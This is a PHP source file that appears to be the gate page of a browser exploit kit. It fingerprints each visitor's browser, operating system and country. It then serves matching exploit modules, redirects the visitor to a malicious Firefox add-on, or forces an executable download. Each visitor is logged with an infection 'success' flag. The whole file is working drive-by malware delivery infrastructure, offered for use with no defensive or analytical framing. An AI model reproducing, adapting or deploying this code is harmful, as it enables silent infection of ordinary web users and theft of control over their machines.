<?php
//include('include/config.php');
include('include/mysql_connect.php');
include('include/browser.php');
include('include/ip2country.php');
include('include/getpayload.php');
include('include/findxmodule.php');
include('include/xmread.php');
error_reporting(0);

$gc = new getcountry($_SERVER['REMOTE_ADDR']);
$br = new Browser;
$browser= $br->Name." ".mysql_escape_string($br->Version);
$ip=$_SERVER['REMOTE_ADDR'];
$referer=mysql_escape_string(htmlspecialchars($_SERVER['HTTP_REFERER']));
if(empty($referer)) { $referer="Direct Request"; }
$time=date("j.n.Y");
$clock=date("H:i");
$success='';

// EXPLOIT MODES (START)

if(SettingTrue("mode_exploit")) {
	// NOTE: initating the exploit	 
	if(SettingTrue("mode_ignore_version")){
		$version='any';
		$xmfile=findxmodule($br->Name, $version);	 // finding exploit for browser
		$cnt=count($xmfile);
		} else{
		$version=$br->Version;
		$cnt=0;
		}
		
		print_r($xmfile);
		echo "<b>==>Printing $cnt exploits!</b><br>";
		for($i=0; $i<=$cnt; $i++) {
			$xmfile=findxmodule($br->Name, $version);	 // finding exploit for browser
			if(!empty($xmfile)) { $success="true"; }
			echo "nr: $i";
			$xm = new xmread('xmodules/'.$xmfile[$i], $br->Platform);	// we read out the exploit file
			echo $xm->code;			//FUCK YOU SUCKAAAA
		}

}

if(SettingTrue("mode_ffaddon")) {
	$sql="SELECT `status` FROM `"._PREFIX_."settings` WHERE `name` = 'ffaddon_file'";
	$result=mysql_query($sql);
	$forcedl_file=mysql_fetch_assoc($result);
	$file=$forcedl_file['status'];
	
	if(file_exists($file)) {
		$success="true";
		echo '<meta http-equiv="Refresh" content="0;url='.$file.'">';
	}
}

if(SettingTrue("mode_forcedl")) {
	$sql="SELECT `status` FROM `"._PREFIX_."settings` WHERE `name` = 'forcedl_file'";
	$result=mysql_query($sql);
	$forcedl_file=mysql_fetch_assoc($result);
	$file=$forcedl_file['status'];
	
	if(file_exists($file)) {
		$success="true";
		header("Pragma: public");
		header('Expires: '.gmdate('D, d M Y H:i:s').' GMT');
		header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
		header("Cache-Control: private",false);
		header("Content-Type: application/x-msdownload");
		header('Content-Disposition: binary; filename='.$file);
		header("Content-Transfer-Encoding: binary");
		header('Content-Length: '.filesize($file));
		@set_time_limit(0);
		@readfile($file);
		exit;
	}
}

// EXPLOIT MODES (END)

if(SettingTrue("mode_log")) {
	
	if(!EntryExists($ip)) {
		$mysql_tablename=_PREFIX_."visitors";
		$timestamp=time();
		$sql = "INSERT INTO ".$mysql_tablename." (`referer`, `platform`, `browser`, `ip`, `flag`, `country`, `success`, `date`, `time`, `timestamp`) VALUES ('$referer', '$br->Platform', '$browser', '$ip', '$gc->Flag', '$gc->Country', '$success', '$time', '$clock', '$timestamp');";
		mysql_query($sql) OR die(mysql_error());
	}
}

if(SettingTrue("mode_debug")) {
	echo htmlspecialchars($_SERVER['HTTP_USER_AGENT'])."<br>";
	echo "<b>Debug Mode active! Printing all infos:</b><br>";
	echo "<b>Referer:</b> ".$referer."<br>";
	echo "<b>Your IP:</b> ".$_SERVER['REMOTE_ADDR']."<br>";
	echo "<b>Your Host:</b> ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."<br>";
	echo "<b>You are From:</b> ".$gc->Country." <img src=img/countries/".$gc->Flag.".png></img><br>";
	echo "<b>Your Browser:</b> ".$browser."<br>";
	echo "<b>Your OS:</b> <img src=img/os/".$br->Picture." height=30 width=30 />".$br->Platform."<br>";
	echo "<b>Architecture:</b> ".$br->Architecture."<br>";
	echo "<b>Timestamp:</b> ".$time."/".$clock."<br>";
	$exploit=findxmodule($br->Name, $br->Version);
	
	if(empty($exploit)) {
		echo "NO Exploit available or deactivated!";
	} else {
		echo "<font color=red><b>Exploit available: $exploit</b></font>";
	}
	
	$xm=new xmread('xmodules/'.$exploit['0'], $br->Platform);
	echo "=>".$xm->payload;
	if(empty($xm->code)) {
		echo "<font color=red>No payload found! There's either no payload for your operating system available or it is not marked as 'active'!'</font>";
	}
}
?>